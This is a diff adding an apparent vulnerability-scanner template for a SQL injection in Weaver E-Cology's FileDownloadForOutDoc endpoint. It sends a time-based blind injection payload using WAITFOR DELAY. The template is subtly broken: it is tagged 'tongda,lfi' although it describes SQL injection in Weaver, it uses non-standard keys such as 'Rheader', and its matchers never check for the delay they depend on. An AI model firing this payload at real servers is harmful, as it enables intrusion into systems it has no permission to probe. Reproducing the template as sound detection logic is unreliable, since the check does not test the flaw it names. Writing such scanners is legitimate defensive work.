@@ -1,0 +1,35 @@
+id: 泛微E-Cology FileDownloadForOutDoc
+time: "2023-07-12"
+
+info:
+  name: 泛微E-Cology FileDownloadForOutDoc
+  author: pikpikcu
+  severity: critical
+  description: 泛微E-Cology sql注入 Ecology 9.x 补丁版本 < 10.58.0 Ecology 8.x 补丁版本 < 10.58.0
+  tags: tongda,lfi
+
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/weaver/weaver.file.FileDownloadForOutDoc"
+    
+    Rheader:
+      - Accept:*/* & Accept-Encoding:gzip, deflate
+    body: 
+      - |
+        fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
+    
+
+    matchers-condition: and
+    matchers:
+      
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionid"
+        condition: and
+      
+      - type: status
+        status:
+          - 200
